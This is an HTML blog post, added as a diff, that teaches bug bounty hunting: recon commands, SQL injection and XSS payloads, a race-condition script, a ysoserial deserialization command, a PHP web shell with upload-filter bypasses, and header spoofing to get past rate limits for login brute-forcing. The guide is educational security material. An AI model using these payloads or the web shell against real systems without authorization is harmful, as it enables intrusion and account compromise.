@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bug Bounty Hunting: From Zero to Hero - Complete Beginner's Guide</title>
+    <style>
+        :root {
+            --bg-primary: #0d1117;
+            --bg-secondary: #161b22;
+            --bg-tertiary: #21262d;
+            --text-primary: #c9d1d9;
+            --text-secondary: #8b949e;
+            --accent-primary: #58a6ff;
+            --accent-secondary: #1f6feb;
+            --border-color: #30363d;
+            --success: #3fb950;
+            --warning: #d29922;
+            --danger: #f85149;
+            --code-bg: #161b22;
+            --bounty-accent: #a371f7;
+        }
+
+        [data-theme="light"] {
+            --bg-primary: #ffffff;
+            --bg-secondary: #f6f8fa;
+            --bg-tertiary: #eaeef2;
+            --text-primary: #24292f;
+            --text-secondary: #57606a;
+            --accent-primary: #0969da;
+            --accent-secondary: #0550ae;
+            --border-color: #d0d7de;
+            --success: #1a7f37;
+            --warning: #9a6700;
+            --danger: #cf222e;
+            --code-bg: #f6f8fa;
+            --bounty-accent: #6f42c1;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.8;
+            transition: background 0.3s ease, color 0.3s ease;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+
+        .back-link {
+            color: var(--accent-primary);
+            text-decoration: none;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        .theme-toggle {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .theme-toggle:hover {
+            background: var(--bg-tertiary);
+            border-color: var(--accent-primary);
+        }
+
+        .post-header {
+            margin-bottom: 50px;
+        }
+
+        .post-category {
+            display: inline-block;
+            padding: 8px 20px;
+            background: #ff5757;
+            color: white;
+            border-radius: 25px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .post-title {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            color: var(--text-primary);
+            line-height: 1.2;
+        }
+
+        .post-meta {
+            display: flex;
+            gap: 20px;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            padding-bottom: 30px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .post-content {
+            font-size: 1.05rem;
+            line-height: 1.8;
+        }
+
+        .post-content h2 {
+            font-size: 1.8rem;
+            margin: 40px 0 20px 0;
+            color: var(--text-primary);
+        }
+
+        .post-content h3 {
+            font-size: 1.4rem;
+            margin: 30px 0 15px 0;
+            color: var(--text-primary);
+        }
+
+        .post-content h4 {
+            font-size: 1.1rem;
+            margin: 20px 0 10px 0;
+            color: var(--text-primary);
+        }
+
+        .post-content p {
+            margin-bottom: 20px;
+            color: var(--text-secondary);
+        }
+
+        .post-content ul, .post-content ol {
+            margin: 20px 0;
+            padding-left: 30px;
+        }
+
+        .post-content li {
+            margin-bottom: 10px;
+            color: var(--text-secondary);
+        }
+
+        .post-content code {
+            background: var(--code-bg);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: var(--accent-primary);
+        }
+
+        .post-content pre {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            overflow-x: auto;
+        }
+
+        .post-content pre code {
+            background: transparent;
+            padding: 0;
+            color: var(--text-primary);
+            display: block;
+        }
+
+        .info-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--accent-primary);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .warning-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--warning);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .danger-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--danger);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .success-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--success);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .info-box h4, .warning-box h4, .danger-box h4, .success-box h4 {
+            margin-bottom: 10px;
+            color: var(--text-primary);
+        }
+
+        .tools-table {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            margin: 20px 0;
+            overflow-x: auto;
+        }
+
+        .tools-table table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .tools-table th {
+            background: var(--bg-tertiary);
+            padding: 15px;
+            text-align: left;
+            color: var(--text-primary);
+            font-weight: 600;
+            border-bottom: 2px solid var(--border-color);
+        }
+
+        .tools-table td {
+            padding: 12px 15px;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-secondary);
+        }
+
+        .tools-table tr:hover {
+            background: var(--bg-tertiary);
+        }
+
+        footer {
+            margin-top: 80px;
+            padding-top: 30px;
+            border-top: 1px solid var(--border-color);
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 768px) {
+            .post-title {
+                font-size: 2rem;
+            }
+
+            .post-content h2 {
+                font-size: 1.5rem;
+            }
+
+            .post-content h3 {
+                font-size: 1.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="top-bar">
+            <a href="../index.html" class="back-link">← Back to Blog</a>
+            <button class="theme-toggle" onclick="toggleTheme()">
+                <span id="theme-icon">☀️</span>
+                <span id="theme-text">Light Mode</span>
+            </button>
+        </div>
+
+        <article>
+            <header class="post-header">
+                <span class="post-category">BUG BOUNTY</span>
+                <h1 class="post-title">Bug Bounty Hunting: From Zero to Hero</h1>
+                <div class="post-meta">
+                    <span>Published: Dec 2025</span>
+                </div>
+            </header>
+
+            <div class="post-content">
+                <p>Bug bounty hunting has emerged as one of the most exciting and lucrative careers in cybersecurity. Whether you're a complete beginner or an experienced penetration tester looking to maximize your earnings, this comprehensive guide will walk you through everything you need to know to succeed. From understanding the fundamentals to discovering overlooked vulnerabilities that others miss, this guide covers reconnaissance techniques, vulnerability identification, professional reporting, and the edge cases that can make the difference between a $50 bounty and a $5,000 one.</p>
+
+                <h2>What is Bug Bounty Hunting? Understanding the Basics</h2>
+
+                <h3>The Definition</h3>
+
+                <p>Bug bounty hunting is the process of identifying and reporting security vulnerabilities in software, websites, and applications. Companies run bug bounty programs (also called vulnerability disclosure programs) to invite ethical hackers to find vulnerabilities before malicious actors can exploit them. When you successfully report a valid vulnerability, you receive a financial reward—ranging from $50 for minor issues to $100,000+ for critical vulnerabilities.</p>
+
+                <div class="info-box">
+                    <h4>💡 Key Insight</h4>
+                    <p>Bug bounty hunting is a win-win: companies get security testing at a fraction of the cost of hiring penetration testing firms, and you get paid for finding vulnerabilities. Unlike penetration testing, you don't need a contract or prior relationship with the company—anyone can participate in public programs.</p>
+                </div>
+
+                <h3>Why Bug Bounty Hunting?</h3>
+
+                <ul>
+                    <li><strong>Flexible Income:</strong> Work at your own pace, choose your targets, earn on your schedule</li>
+                    <li><strong>Skill Development:</strong> Real-world hacking experience with instant feedback</li>
+                    <li><strong>Career Building:</strong> Demonstrates practical skills to employers; many top researchers have landed jobs through bug bounty reputation</li>
+                    <li><strong>Legal Hacking:</strong> Test real systems with explicit authorization—legal and ethical</li>
+                    <li><strong>Significant Earnings:</strong> Top hunters earn $100,000+ annually; average ranges from $500-$5,000 monthly</li>
+                </ul>
+
+                <h2>Getting Started: The Foundation You Need</h2>
+
+                <h3>Essential Knowledge Before You Start</h3>
+
+                <p>Before jumping into bug bounty hunting, you need a solid foundation in several areas:</p>
+
+                <h4>1. Networking Fundamentals</h4>
+                <ul>
+                    <li><strong>TCP/IP Protocol:</strong> Understand how data travels across networks</li>
+                    <li><strong>HTTP/HTTPS:</strong> Know how web browsers communicate with servers</li>
+                    <li><strong>DNS:</strong> Understanding domain name resolution is critical for reconnaissance</li>
+                    <li><strong>Ports and Services:</strong> Know common ports (80, 443, 22, 3306, 5432, etc.)</li>
+                </ul>
+
+                <h4>2. Web Application Security</h4>
+                <ul>
+                    <li><strong>OWASP Top 10:</strong> Memorize the 10 most critical web application security risks</li>
+                    <li><strong>Common Vulnerabilities:</strong> SQL Injection, XSS, CSRF, IDOR, XXE, RCE</li>
+                    <li><strong>Authentication & Authorization:</strong> How login systems work and where they fail</li>
+                    <li><strong>Cryptography Basics:</strong> Understanding encryption and hashing</li>
+                </ul>
+
+                <h4>3. Programming & Scripting</h4>
+                <ul>
+                    <li><strong>Python:</strong> Write reconnaissance scripts and automate tasks (most important)</li>
+                    <li><strong>Bash:</strong> Linux command line scripting</li>
+                    <li><strong>JavaScript:</strong> Understanding web app logic and finding sensitive endpoints</li>
+                    <li><strong>SQL:</strong> Understanding database queries for SQL injection testing</li>
+                </ul>
+
+                <h2>Setting Up Your Bug Bounty Lab</h2>
+
+                <h3>Essential Tools (Free and Paid)</h3>
+
+                <div class="tools-table">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Category</th>
+                                <th>Tool Name</th>
+                                <th>Purpose</th>
+                                <th>Cost</th>
+                                <th>Priority</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Proxy/Scanner</strong></td>
+                                <td>Burp Suite Community</td>
+                                <td>Web vulnerability scanning and interception</td>
+                                <td>Free</td>
+                                <td>Essential</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Reconnaissance</strong></td>
+                                <td>Subfinder + Amass</td>
+                                <td>Subdomain enumeration</td>
+                                <td>Free</td>
+                                <td>Essential</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Port Scanning</strong></td>
+                                <td>Nmap</td>
+                                <td>Network and service discovery</td>
+                                <td>Free</td>
+                                <td>Essential</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Web Fuzzing</strong></td>
+                                <td>FFUF</td>
+                                <td>Directory and parameter brute-forcing</td>
+                                <td>Free</td>
+                                <td>Essential</td>
+                            </tr>
+                            <tr>
+                                <td><strong>JavaScript Analysis</strong></td>
+                                <td>LinkFinder</td>
+                                <td>Extract endpoints from JavaScript</td>
+                                <td>Free</td>
+                                <td>High</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Vulnerability Scanning</strong></td>
+                                <td>Nuclei</td>
+                                <td>Fast vulnerability template scanning</td>
+                                <td>Free</td>
+                                <td>High</td>
+                            </tr>
+                            <tr>
+                                <td><strong>API Testing</strong></td>
+                                <td>Burp Suite Pro</td>
+                                <td>Advanced API and business logic testing</td>
+                                <td>$399/year</td>
+                                <td>Optional (after 3-6 months)</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h2>The Complete Bug Bounty Hunting Methodology</h2>
+
+                <h3>Phase 1: Reconnaissance - The Foundation</h3>
+
+                <p>Reconnaissance is where 70% of bug bounty success happens. Most hunters skip this phase or do it poorly, which is where opportunities lie.</p>
+
+                <h4>Step 1: Passive Subdomain Enumeration</h4>
+
+                <pre><code># Use Subfinder for rapid passive subdomain discovery
+subfinder -d target.com -silent -all -recursive -o subdomains.txt
+
+# Cross-validate with Amass for comprehensive coverage
+amass enum -d target.com -o amass_subs.txt
+
+# Use crt.sh for certificate transparency logs
+curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > crtsh_subs.txt
+
+# Combine all results and remove duplicates
+cat subdomains.txt amass_subs.txt crtsh_subs.txt | sort -u > all_subdomains.txt</code></pre>
+
+                <h4>Step 2: Alive Host Detection</h4>
+
+                <pre><code># Use httpx to probe which subdomains are actually alive
+httpx -l all_subdomains.txt -status-code -title -o alive_hosts.txt
+
+# This eliminates dead domains and saves time on testing dead targets</code></pre>
+
+                <h4>Step 3: Port and Service Enumeration</h4>
+
+                <pre><code># Light port scan on common ports (avoid aggressive scanning to stay stealthy)
+nmap -p 80,443,8080,8443,3000,5000,9000 -sV alive_hosts_ips.txt -o nmap_results.txt
+
+# Or use masscan for faster scanning (more aggressive, use carefully)
+masscan -p 80,443,8080,8443 --rate=1000 alive_hosts_ips.txt > ports.txt</code></pre>
+
+                <h4>Step 4: Technology Stack Identification</h4>
+
+                <pre><code># Use Wappalyzer or WhatRuns to identify technologies
+# This helps you understand potential vulnerabilities
+
+# Extract and analyze JavaScript files (often reveals API endpoints and logic)
+# Use tools like SubdomainCodeFinder or Katana for advanced crawling
+
+# Check robots.txt and sitemap.xml for hidden paths
+curl -s https://target.com/robots.txt
+curl -s https://target.com/sitemap.xml</code></pre>
+
+                <h3>Phase 2: Discovery - Finding Hidden Assets</h3>
+
+                <h4>Advanced Parameter Discovery</h4>
+
+                <pre><code># Use FFUF with targeted wordlists for parameter discovery
+ffuf -u "https://target.com/search?FUZZ=test" -w params.txt -o params_found.txt
+
+# Fuzz common API parameters
+ffuf -u "https://api.target.com/FUZZ" -w api_endpoints.txt -o api_endpoints_found.txt
+
+# Use arjun for parameter discovery (specialized tool)
+arjun -u https://target.com -t 100</code></pre>
+
+                <h4>JavaScript File Analysis (Critical but Often Overlooked!)</h4>
+
+                <pre><code># Extract all JavaScript files
+# Run a browser, open DevTools, capture all .js files loaded
+
+# Analyze JavaScript with LinkFinder to extract endpoints
+python3 LinkFinder.py -i https://target.com -o cli
+
+# Search JavaScript for:
+# - API endpoints (/api/v1/...)
+# - Hardcoded credentials (aws_access_key_id=...)
+# - Secret keys and tokens
+# - Internal IP addresses
+# - Sensitive comments
+
+# Use grep-based searching
+cat all_js_files.txt | grep -i "api" | grep -i "endpoint"
+cat all_js_files.txt | grep -i "password\|secret\|key\|token"</code></pre>
+
+                <h3>Phase 3: Manual Testing & Vulnerability Hunting</h3>
+
+                <h4>Test for Insecure Direct Object Reference (IDOR)</h4>
+
+                <pre><code># One of the most common and lucrative vulnerabilities
+
+# Look for numeric IDs in URLs and API responses:
+# Example: /api/users/123/profile
+
+# Test by changing the ID:
+# /api/users/456/profile - Can you access another user's data?
+# /api/users/999999/profile - What's the error response?
+# /api/users/-1/profile - Test boundary conditions
+
+# Try in Burp Intruder:
+# Change ID value and check for different responses
+# Look for 200 status codes (success) on unauthorized resources</code></pre>
+
+                <h4>Test for SQL Injection</h4>
+
+                <pre><code># Start with simple payloads in search/filter parameters:
+# search=test' OR '1'='1
+# search=test" OR 1=1--
+# search=test' UNION SELECT NULL--
+
+# Use SQLMap for automated testing (use carefully to avoid detection):
+sqlmap -u "https://target.com/search?q=test" --batch --dbs
+
+# Manual testing often finds what automated tools miss
+# Test error-based, time-based, and blind SQLi techniques</code></pre>
+
+                <h4>Test for XSS (Cross-Site Scripting)</h4>
+
+                <pre><code># Simple payload testing:
+# Input: <img src=x onerror=alert(1)>
+# Input: <svg onload=alert(1)>
+# Input: "><script>alert(1)</script>
+
+# Test in all input fields:
+# Search boxes, comment sections, user profiles, settings
+
+# Use tools like XSSStrike for semi-automated testing:
+# python3 xssstrike.py -u "https://target.com/search?q=test"
+
+# Important: Test reflected AND stored XSS
+# Stored XSS is much more valuable (higher bounty)</code></pre>
+
+                <h2>The Overlooked Edge Cases: Where the Money Is</h2>
+
+                <p>Most bug bounty hunters only test obvious endpoints and parameters. The real money is in finding edge cases that penetration testers overlook. Here are the most profitable overlooked areas:</p>
+
+                <h3>Edge Case 1: Legacy/Deprecated Endpoints</h3>
+
+                <pre><code>Problem: Old API versions (/api/v1/, /api/v2/) often lack security features
+
+# Test: What old API versions still exist?
+# /api/v1/users - doesn't require authentication
+# /api/v2/users - requires authentication
+# /api/v3/users - doesn't exist (but v1 works!)
+
+# Reconnaissance technique:
+# Search GitHub for old documentation or commits
+# Check Wayback Machine for historical endpoints
+# Look for version numbers in JavaScript files from 6+ months ago
+
+# Finding: Can bypass authentication by using old API versions!
+# Result: CRITICAL severity, $5,000+ bounty</code></pre>
+
+                <h3>Edge Case 2: Forgotten Administrative Endpoints</h3>
+
+                <pre><code>Problem: Devs create /admin, /api/admin, /dashboard for testing and forget to remove
+
+# Discovery techniques:
+# Common paths to test:
+# /admin, /admin/, /administrator
+# /wp-admin (even if not WordPress)
+# /api/admin
+# /management, /panel, /console
+# /internal, /staff, /employee
+# /_admin, /_secret, /super-secret-admin
+
+# Tools to automate discovery:
+ffuf -u "https://target.com/FUZZ" -w admin_wordlist.txt
+
+# Finding: Access to admin panel without authentication = CRITICAL
+# Result: $3,000-$10,000 bounty</code></pre>
+
+                <h3>Edge Case 3: Race Condition Vulnerabilities</h3>
+
+                <pre><code>Problem: Concurrent requests can bypass logical checks
+
+# Examples:
+# 1. Bank transfer: Check balance, then deduct (between check and deduct, race)
+# 2. Coupon code: Check usage count, then apply (apply twice simultaneously)
+# 3. Ticket booking: Check availability, then reserve
+
+# Testing technique:
+# Send multiple requests in rapid succession
+# Use Burp Repeater with "Group Tab" feature
+# Or use threading in Python scripts
+
+# Example Python script:
+import threading
+import requests
+
+def send_request():
+    requests.post("https://target.com/transfer", data={"amount": 1000})
+
+threads = []
+for i in range(100):
+    t = threading.Thread(target=send_request)
+    threads.append(t)
+    t.start()
+
+for t in threads:
+    t.join()
+
+# Finding: Transfer $100 multiple times simultaneously, account debited once
+# Result: CRITICAL, $5,000+ bounty</code></pre>
+
+                <h3>Edge Case 4: Broken Business Logic</h3>
+
+                <pre><code>Problem: Logical flaws rather than technical vulnerabilities
+
+# Examples:
+# 1. Negative quantities: Can you set quantity to -5 to get $$ refunded?
+# 2. Price manipulation: Can you modify price in request before payment?
+# 3. Discount stacking: Can you apply 10 discounts totaling 1000% off?
+# 4. Workflow bypass: Skip steps in multi-step process
+
+# Testing technique:
+# Understand the business flow
+# Think like a malicious user, not a tech hacker
+# Test boundary conditions (-1, 0, max integer, etc.)
+# Test with Burp Intruder to modify quantities, prices, percentages
+
+# Finding: Apply infinite discounts to get free products
+# Result: HIGH, $1,000-$3,000 bounty</code></pre>
+
+                <h3>Edge Case 5: Insecure Deserialization in Java/Python</h3>
+
+                <pre><code>Problem: Unsafe deserialization can lead to RCE
+
+# Look for:
+# - Java apps passing serialized objects
+# - Python pickle usage
+# - PHP unserialize()
+
+# Testing:
+# Identify serialized data (often base64 encoded, starts with specific bytes)
+# Attempt to exploit with known gadget chains (ysoserial for Java)
+
+# Java example:
+java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned' | base64
+
+# Insert payload into application request
+
+# Finding: Remote Code Execution
+# Result: CRITICAL, $10,000+ bounty</code></pre>
+
+                <h3>Edge Case 6: Unrestricted File Upload to RCE</h3>
+
+                <pre><code>Problem: File upload filters are often incomplete
+
+# Common bypass techniques:
+# 1. Extension tricks: .php.jpg, .php.txt, .phtml, .php3, .php5
+# 2. MIME type manipulation: Change Content-Type to image/jpeg
+# 3. Null byte injection: shell.php%00.jpg (older systems)
+# 4. Double extension: shell.jpg.php
+# 5. Case variation: shell.PhP, shell.pHp
+
+# Testing technique:
+# Try uploading a file with each variation
+# Check where file is saved
+# Try to access via web browser
+
+# Example:
+# 1. Create shell.php with <?php system($_GET['cmd']); ?>
+# 2. Upload as shell.php.jpg
+# 3. Access at /uploads/shell.php (sometimes extensionless)
+# 4. Execute: /uploads/shell.php?cmd=whoami
+
+# Finding: Remote Code Execution via file upload
+# Result: CRITICAL, $5,000-$15,000 bounty</code></pre>
+
+                <h3>Edge Case 7: Subdomain Takeover</h3>
+
+                <pre><code>Problem: Subdomains pointing to unclaimed third-party services
+
+# Discovery technique:
+# 1. Find subdomains (as per Phase 1)
+# 2. For each subdomain, check its CNAME record:
+nslookup subdomain.target.com
+
+# 3. If CNAME points to: github.io, herokuapp.com, s3.amazonaws.com, etc.
+# 4. Check if that service is unclaimed
+
+# Example:
+# cdn.target.com CNAME points to target.s3.amazonaws.com
+# But target.s3.amazonaws.com doesn't exist anymore
+# You can create it and claim the subdomain!
+
+# Verification tools:
+# Subjack, Subzy, or nuclei with takeover templates
+./subjack -w subdomains.txt -t 100
+
+# Finding: Subdomain takeover
+# Result: HIGH, $500-$5,000 bounty</code></pre>
+
+                <h3>Edge Case 8: Rate Limiting Bypass</h3>
+
+                <pre><code>Problem: Rate limits exist but can be bypassed
+
+# Bypass techniques:
+# 1. X-Forwarded-For header: Add different IPs
+# 2. X-Original-IP header: Spoof originating IP
+# 3. User-Agent rotation: Change user-agent header
+# 4. Distributed requests: Use multiple proxy chains
+
+# Example with Burp:
+# Add custom header: X-Forwarded-For: 127.0.0.1
+# Change for each request in Intruder
+
+# Use case: Brute force login after bypassing rate limit
+
+# Finding: Bypass rate limiting to brute-force credentials
+# Result: HIGH, $2,000-$5,000 bounty</code></pre>
+
+                <h3>Edge Case 9: Recently Acquired Companies</h3>
+
+                <pre><code>Problem: During company acquisitions, security is inconsistent
+
+# The chaos of integration creates vulnerabilities:
+# 1. Permission model inconsistencies
+# 2. Orphaned API endpoints still accessible
+# 3. Cross-tenant isolation failures
+# 4. Legacy systems not properly secured
+
+# Discovery technique:
+# 1. Find acquired companies: Search news, SEC filings
+# 2. Enumerate their subdomains
+# 3. Test for cross-access between systems
+# 4. Look for old authentication methods still working
+
+# Finding: Access to acquired company's data through parent company system
+# Result: CRITICAL, $10,000+ bounty</code></pre>
+
+                <h3>Edge Case 10: API Endpoint Not in Documentation</h3>
+
+                <pre><code>Problem: Developers create APIs for internal use, forget to secure them
+
+# Discovery technique:
+# 1. JavaScript analysis (LinkFinder)
+# 2. Mobile app reverse engineering
+# 3. Burp history from browsing as admin user
+# 4. Guess common patterns:
+
+# Common API patterns:
+/api/v1/admin/users
+/api/v1/admin/logs
+/api/v1/admin/settings
+/api/v1/internal/debug
+/api/internal/stats
+/api/users/export
+/api/debug/logs
+
+# Finding: Undocumented admin API accessible without auth
+# Result: CRITICAL, $5,000+ bounty</code></pre>
+
+                <h2>Essential Tips and Tricks for Success</h2>
+
+                <h3>Reconnaissance Tips</h3>
+
+                <ul>
+                    <li><strong>Custom Wordlists:</strong> Don't use default wordlists. Extract keywords from the company's website, GitHub repos, and past disclosures. Custom wordlists find 10x more vulnerabilities.</li>
+                    <li><strong>Historical Data:</strong> Use Wayback Machine to find old endpoints, APIs, and configurations that might still work</li>
+                    <li><strong>GitHub Secrets Scanning:</strong> Search GitHub for company repos, find exposed keys
